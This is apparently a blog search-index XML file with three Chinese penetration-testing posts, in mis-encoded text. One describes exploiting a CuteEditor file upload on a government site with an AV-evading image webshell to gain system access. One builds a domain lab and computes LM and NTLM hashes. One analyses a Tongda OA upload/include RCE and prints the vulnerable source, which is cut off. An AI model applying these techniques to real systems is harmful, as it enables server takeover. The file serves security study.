<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CuteEditorç¼–è¾‘å™¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
    <url>/2020/04/29/CuteEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="0x00-èƒŒæ™¯æè¿°"><a href="#0x00-èƒŒæ™¯æè¿°" class="headerlink" title="0x00 èƒŒæ™¯æè¿°"></a><strong>0x00 èƒŒæ™¯æè¿°</strong></h1><p>æŸgovå¤§å‹é¡¹ç›®ä¸­çš„ä¸€å¤„CuteEditorç¼–è¾‘å™¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</p>
<p>æ¼æ´ç¼–å· wooyun-2015-0118429</p>
<h1 id="0x01-æ¸—é€æµ‹è¯•"><a href="#0x01-æ¸—é€æµ‹è¯•" class="headerlink" title="0x01 æ¸—é€æµ‹è¯•"></a><strong>0x01 æ¸—é€æµ‹è¯•</strong></h1><p>ä½¿ç”¨è‡ªå¸¦çš„æ³¨å†ŒåŠŸèƒ½éšæ„æ³¨å†Œä¸€ä¸ªè´¦æˆ· è¿›å…¥åå°</p>
<p><img src="/2020/04/29/CuteEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20200429192929875.png" alt="image-20200429192929875"></p>
<p>ä½¿ç”¨ç¼–è¾‘å™¨å‘å¸ƒåŠŸèƒ½æ’å…¥å›¾ç‰‡ï¼Œè¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒæç¬‘çš„äº‹æƒ…ï¼Œæˆ‘çš„ç”Ÿäº§åŠ›å·¥å…·æ˜¯macï¼Œåº”è¯¥æ˜¯è¿™ä¸ªç½‘ç«™æ¯”è¾ƒè€ï¼Œä¸Šä¼ ç‚¹è°ƒä¸å‡ºæˆ‘çš„æœ¬åœ°æ–‡ä»¶ç®¡ç†å™¨ã€‚å¼€å§‹ä¸€åº¦æ”¾å¼ƒâ€¦åæ¥è½¬äº†ä¸€åœˆä¸ç”˜å¿ƒï¼Œåˆä½¿ç”¨win7è™šæ‹Ÿæœºå¯ä»¥ã€‚</p>
<p><img src="/2020/04/29/CuteEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20200429193441541.png" alt="image-20200429193441541"></p>
<p><img src="/2020/04/29/CuteEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20200429193527427.png" alt="image-20200429193527427"></p>
<p>åœ¨æœ¬åœ°ä¸Šä¼ å›¾ç‰‡é©¬ å› ä¸ºæ˜¯.netçš„ç¯å¢ƒï¼Œä½¿ç”¨pngå’Œaspxæœ¨é©¬åˆæˆï¼Œç›®æ ‡æœºæœ‰360ï¼Œéœ€è¦æœ¨é©¬åšå…æ€ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªå‘å°±æ˜¯æœåŠ¡å™¨æ— æ³•æˆåŠŸè§£æå›¾ç‰‡é©¬ï¼Œå› ä¸ºåˆæˆçš„å›¾ç‰‡é©¬æ˜¯æŠŠpayloadè¿½åŠ åˆ°å›¾ç‰‡ä»£ç åé¢ï¼Œæˆ‘ä»¬æ˜¯ç»•è¿‡è¿‡è½åœ°æ—¶æ—¶aspxæ ¼å¼çš„æœ¨é©¬ï¼Œè€ŒæœåŠ¡å™¨ä»å¤´å¼€å§‹è§£ææ–‡ä»¶é‡åˆ°å›¾ç‰‡å‰é¢çš„ä¸€äº›å°–è§’ç¬¦å·ä¼šå¯¼è‡´è§£æå¤±è´¥ï¼Œè¿™é‡Œçš„è§£å†³åŠæ³•æ˜¯éœ€è¦æˆ‘ä»¬ä½¿ç”¨winè‡ªå¸¦çš„ç”»å›¾åŠŸèƒ½åšä¸€ä¸ªç©ºç™½å›¾ç‰‡ï¼Œè¿™æ ·å›¾ç‰‡çš„ä¹±ç å¹²æ‰°å°±å¥½å¾ˆå¤šã€‚å…æ€çš„payloadæˆ‘å°±é©¬èµ›å…‹äº†ğŸ˜‚</p>
<p><img src="/2020/04/29/CuteEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20200429194541219.png" alt="image-20200429194541219"></p>
<p>è¿™æ˜¯å¤±è´¥çš„ï¼Œçœ‹åˆ°æœ‰å¤§é‡çš„å›¾ç‰‡ä¹±ç ä¼šå¹²æ‰°è§£æ</p>
<p><img src="/2020/04/29/CuteEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20200429194653571.png" alt="image-20200429194653571"></p>
<p>æˆ‘ä»¬å…ˆä»¥pngæ ¼å¼ä¸Šä¼ åˆ°ç¼–è¾‘å™¨ï¼Œä½¿ç”¨é‡å‘½ååŠŸèƒ½æŠŠæ–‡ä»¶å˜æˆxx.aspx.pngçš„æ ¼å¼</p>
<p><img src="/2020/04/29/CuteEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20200429195116494.png" alt="image-20200429195116494"></p>
<p>è¿™é‡ŒæŠ“åŒ… æˆ‘çš„bpåŒ…ä¸¢äº†æ‰¾ä¸åˆ°äº†ï¼Œå†™æ–‡ç« æ€»ç»“çš„æ—¶å€™å·²ç»æäº¤æ¼æ´ç»™å®¢æˆ·äº†ï¼Œå†æ‰“ä¸€æ¬¡ä¸å¤ªå¥½â€¦æ‰¾äº†åˆ«çš„å›¾ä»£æ›¿ä¸‹ ä¸€æ ·çš„</p>
<p><img src="/2020/04/29/CuteEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20200429195349502.png" alt="image-20200429195349502"></p>
<p>Falseå˜æˆTrueï¼Œxx.aspx.pngæ”¹æˆxx.aspx<br>Forwardæ”¾è¿‡å»ï¼ŒæˆåŠŸè½åœ°<br>å·¥å…·è¿è¿‡å»ï¼Œsystemæƒé™æ‹¿åˆ°</p>
<p><img src="/2020/04/29/CuteEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20200429195909143.png" alt="image-20200429195909143"></p>
]]></content>
      <categories>
        <category>æ¸—é€å®æˆ˜</category>
      </categories>
  </entry>
  <entry>
    <title>åŸŸç¯å¢ƒæ­å»º</title>
    <url>/2020/04/20/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="0x00-åŸŸç¯å¢ƒæ­å»º"><a href="#0x00-åŸŸç¯å¢ƒæ­å»º" class="headerlink" title="0x00 åŸŸç¯å¢ƒæ­å»º"></a><strong>0x00 åŸŸç¯å¢ƒæ­å»º</strong></h1><h2 id="1-èƒŒæ™¯æè¿°"><a href="#1-èƒŒæ™¯æè¿°" class="headerlink" title="1.èƒŒæ™¯æè¿°"></a>1.èƒŒæ™¯æè¿°</h2><p>ä¸€å…±ä¸‰å°ä¸»æœºï¼Œwin2008r2æ˜¯åŸŸæ§ï¼Œwin2012r2æ˜¯serverå®‰è£…exchange2013ï¼Œwin7æ˜¯æˆå‘˜ã€‚</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p>1: <a href>https://www.cnblogs.com/wuxinmengyi/p/11598181.html</a></p>
<p>2: <a href="https://www.cnblogs.com/jianyus/archive/2013/07/04/3170732.html" target="_blank" rel="noopener">https://www.cnblogs.com/jianyus/archive/2013/07/04/3170732.html</a></p>
<h2 id="2-win2008r2"><a href="#2-win2008r2" class="headerlink" title="2.win2008r2"></a>2.win2008r2</h2><p>è¯¦ç»†å®‰è£…è¿‡ç¨‹å‚è€ƒ<a href>https://www.cnblogs.com/wuxinmengyi/p/11598181.html</a></p>
<p><img src="/2020/04/20/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200420112404809.png" alt="image-20200420112404809"></p>
<p><img src="/2020/04/20/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200420133529239.png" alt="image-20200420133529239"></p>
<p><img src="/2020/04/20/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200420112508844.png" alt="image-20200420112508844"></p>
<h2 id="3-win7"><a href="#3-win7" class="headerlink" title="3.win7"></a>3.win7</h2><p><img src="/2020/04/20/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200420142608803.png" alt="image-20200420142608803"></p>
<p><img src="/2020/04/20/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200420142634607.png" alt="image-20200420142634607"></p>
<h2 id="3-Win2012"><a href="#3-Win2012" class="headerlink" title="3.Win2012"></a>3.Win2012</h2><p>exchange2013æœ‰ä¸€äº›å¿…å¤‡è½¯ä»¶æ˜¯å¾®è½¯ç½‘ç«™çš„ ç½‘ç»œä¸å¥½ä¸‹ä¸åŠ¨ åæœŸä¼šè¡¥ä¸Š</p>
<p><img src="/2020/04/20/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200420223943601.png" alt="image-20200420223943601"></p>
<h1 id="0x01-æ‰‹åŠ¨åŠ å¯†-LM-Hashã€NTLM-Hash"><a href="#0x01-æ‰‹åŠ¨åŠ å¯†-LM-Hashã€NTLM-Hash" class="headerlink" title="0x01 æ‰‹åŠ¨åŠ å¯† LM_Hashã€NTLM_Hash"></a><strong>0x01 æ‰‹åŠ¨åŠ å¯† LM_Hashã€NTLM_Hash</strong></h1><h2 id="1-NTML-HashåŠ å¯†è¿‡ç¨‹"><a href="#1-NTML-HashåŠ å¯†è¿‡ç¨‹" class="headerlink" title="1. NTML_HashåŠ å¯†è¿‡ç¨‹"></a>1. NTML_HashåŠ å¯†è¿‡ç¨‹</h2><p>yanghuan-79616e676875616eï¼ˆ16è¿›åˆ¶ç¼–ç ï¼‰</p>
<p>79616e676875616e-790061006e0067006800750061006e00ï¼ˆasciiè½¬unicodeï¼‰</p>
<p>790061006e0067006800750061006e00-69697f06ed212bc214360f15bd7d8468ï¼ˆmd4åŠ å¯†å¾—åˆ°hashï¼‰</p>
<h2 id="2-LM-Hash"><a href="#2-LM-Hash" class="headerlink" title="2. LM_Hash"></a>2. LM_Hash</h2><p>yanghuan-YANGHUANï¼ˆå°†å¯†ç å­—æ¯è½¬æ¢æˆå¤§å†™ï¼‰</p>
<p>YANGHUAN-59414e474855414eï¼ˆ16è¿›åˆ¶è½¬æ¢ï¼‰</p>
<p>59414e474855414e-59414e474855414e000000000000ï¼ˆè¡¥0åˆ°28ä½ï¼‰</p>
<p>59414e47485541    4e000000000000ï¼ˆåˆ†ä¸ºä¸¤ç»„,å„è½¬æ¢ä¸º2è¿›åˆ¶ï¼‰</p>
<p>01011001010000010100111001000111010010000101010101000000(é•¿åº¦ä¸è¶³56bitï¼Œå·¦ä¾§è¡¥0ï¼Œå†åˆ†ä¸º7bitä¸€ç»„ï¼ŒååŠ 0)</p>
<p>01001110000000000000000000000000000000000000000000000000(é•¿åº¦ä¸è¶³56bitï¼Œå·¦ä¾§è¡¥0ï¼Œå†åˆ†ä¸º7bitä¸€ç»„ï¼ŒååŠ 0)</p>
<p>å‰æ®µ</p>
<p>01011000</p>
<p>10100000</p>
<p>01010010</p>
<p>11001000</p>
<p>01110100</p>
<p>01000010</p>
<p>01010100</p>
<p>10000000</p>
<p>åæ®µ</p>
<p>01001110</p>
<p>00000000</p>
<p>00000000</p>
<p>00000000</p>
<p>00000000</p>
<p>00000000</p>
<p>00000000</p>
<p>00000000</p>
<p>0101100010100000010100101100100001110100010000100101010010000000-58a052c874425400ï¼ˆè½¬æ¢ä¸º16è¿›åˆ¶ï¼‰</p>
<p>0100111000000000000000000000000000000000000000000000000000000000-4e00000000000000ï¼ˆè½¬æ¢ä¸º16è¿›åˆ¶ï¼‰</p>
<p>ç”¨ä¸Šé¢çš„ä¸¤ä¸ªå¯¹4b47532140232425ï¼ˆé­”æœ¯å­—ç¬¦ä¸²<em>â€œKGS!@#$%â€</em>ï¼‰è¿›è¡ŒdesåŠ å¯†</p>
<p>å¾—åˆ°çš„æ‹¼æ¥åœ¨ä¸€èµ·å°±æ˜¯Lm_Hash</p>
<h1 id="0x02-è‡ªè¡Œè§¦å‘UAC"><a href="#0x02-è‡ªè¡Œè§¦å‘UAC" class="headerlink" title="0x02 è‡ªè¡Œè§¦å‘UAC"></a><strong>0x02 è‡ªè¡Œè§¦å‘UAC</strong></h1><p>win7ä¸Šå¯¹c:\program files x86ç›®å½•å†™å…¥æ–‡ä»¶ä¼šè§¦å‘uac</p>
<p><img src="/2020/04/20/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200420224843029.png" alt="image-20200420224843029"></p>
<p><img src="/2020/04/20/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20200420224908433.png" alt="image-20200420224908433"></p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¾¾OAä»»æ„æ–‡ä»¶ä¸Šä¼ /æ–‡ä»¶åŒ…å«RCEæ¼æ´</title>
    <url>/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="0x00-æ¼æ´èƒŒæ™¯"><a href="#0x00-æ¼æ´èƒŒæ™¯" class="headerlink" title="0x00 æ¼æ´èƒŒæ™¯"></a><strong>0x00 æ¼æ´èƒŒæ™¯</strong></h1><p>é€šè¾¾OAï¼ˆOffice Anywhereç½‘ç»œæ™ºèƒ½åŠå…¬ç³»ç»Ÿï¼‰æ˜¯ç”±åŒ—äº¬é€šè¾¾ä¿¡ç§‘ç§‘æŠ€æœ‰é™å…¬å¸è‡ªä¸»ç ”å‘çš„ååŒåŠå…¬è‡ªåŠ¨åŒ–ç³»ç»Ÿï¼ŒåŒ…æ‹¬æµç¨‹å®¡æ‰¹ã€è¡Œæ”¿åŠå…¬ã€æ—¥å¸¸äº‹åŠ¡ã€æ•°æ®ç»Ÿè®¡åˆ†æã€å³æ—¶é€šè®¯ã€ç§»åŠ¨åŠå…¬ç­‰ã€‚</p>
<p>é€šè¾¾ä¿¡ç§‘åœ¨2020å¹´3æœˆ13æ—¥å‘å¸ƒäº†æ›´æ–°åŒ…ï¼Œä¿®å¤äº†åœ¨/ispirit/im/upload.phpçš„ä¸Šä¼ æ¼æ´ä¸åœ¨/ispirit/interface/gateway.phpçš„åŒ…å«æ¼æ´ï¼Œä¸Šä¼ æ¼æ´è¢«é»‘äº§åˆ©ç”¨ï¼Œç”¨äºæŠ•æ”¾å‹’ç´¢ç—…æ¯’ã€‚åœ¨ç»•è¿‡èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹é€šè¿‡æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼ æ¶æ„phpæ–‡ä»¶ï¼Œç»„åˆæ–‡ä»¶åŒ…å«æ¼æ´æœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä»è€Œå¯¼è‡´å¯ä»¥æ§åˆ¶æœåŠ¡å™¨systemæƒé™ã€‚</p>
<h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01 æ¼æ´åˆ†æ"></a><strong>0x01 æ¼æ´åˆ†æ</strong></h1><h2 id="1-æ¼æ´åŸç†"><a href="#1-æ¼æ´åŸç†" class="headerlink" title="1. æ¼æ´åŸç†"></a>1. æ¼æ´åŸç†</h2><p>ç»•è¿‡èº«ä»½éªŒè¯æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†<br>Webroot\ispirit\im\upload.phpçš„æºç å¦‚ä¸‹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">'P'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">''</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'./auth.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_file.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_msg.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'mobile/inc/funcs.php'</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">$TYPE = $_POST[<span class="string">'TYPE'</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">'DEST_UID'</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">''</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'Â½Ã“ÃŠÃ•Â·Â½IDÃÃÃÂ§'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">','</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'Â½Ã“ÃŠÃ•Â·Â½IDÃÃÃÂ§'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">'im'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) != strlen($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>] = urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = upload(<span class="string">'ATTACHMENT'</span>, $MODULE, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . $ATTACHMENTS);</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    $ATTACHMENT_ID = substr($ATTACHMENTS[<span class="string">'ID'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    $ATTACHMENT_NAME = substr($ATTACHMENTS[<span class="string">'NAME'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ($TYPE == <span class="string">'mobile'</span>) &#123;</span><br><span class="line">        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÃÃÃÃ„Â¼Ã¾Ã‰ÃÂ´Â«'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line"><span class="keyword">if</span> (!$FILE_SIZE) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÃÃ„Â¼Ã¾Ã‰ÃÂ´Â«ÃŠÂ§Â°Ãœ'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">        $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">        CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    $P_VER = is_numeric($P_VER) ? intval($P_VER) : <span class="number">0</span>;</span><br><span class="line">    $MSG_CATE = $_POST[<span class="string">'MSG_CATE'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($MSG_CATE == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($MSG_CATE == <span class="string">'image'</span>) &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[im]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/im]'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $DURATION = intval($DURATION);</span><br><span class="line">            $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $AID = <span class="number">0</span>;</span><br><span class="line">    $POS = strpos($ATTACHMENT_ID, <span class="string">'@'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $AID = intval(substr($ATTACHMENT_ID, <span class="number">0</span>, $POS));</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">'INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\',\''</span> . $AID . <span class="string">'\')'</span>;</span><br><span class="line">    $cursor = exequery(TD::conn(), $query);</span><br><span class="line">    $FILE_ID = mysql_insert_id();</span><br><span class="line">    <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÃŠÃ½Â¾ÃÂ¿Ã¢Â²Ã™Ã—Ã·ÃŠÂ§Â°Ãœ'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'content'</span> =&gt; $CONTENT, <span class="string">'file_id'</span> =&gt; $FILE_ID);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'2'</span>) &#123;</span><br><span class="line">        $DURATION = intval($_POST[<span class="string">'DURATION'</span>]);</span><br><span class="line">        $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        $query = <span class="string">'INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES (\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\', \''</span> . $CONTENT . <span class="string">'\', \''</span> . time() . <span class="string">'\')'</span>;</span><br><span class="line">        $cursor = exequery(TD::conn(), $query);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'+OK '</span> . $CONTENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'3'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">                $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">                $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">                CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK '</span> . $ATTACHMENT_ID;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">            $msg_id = send_msg($_SESSION[<span class="string">'LOGIN_UID'</span>], $DEST_UID, <span class="number">1</span>, $CONTENT, <span class="string">''</span>, <span class="number">2</span>);</span><br><span class="line">            $query = <span class="string">'insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\')'</span>;</span><br><span class="line">            $cursor = exequery(TD::conn(), $query);</span><br><span class="line">            $FILE_ID = 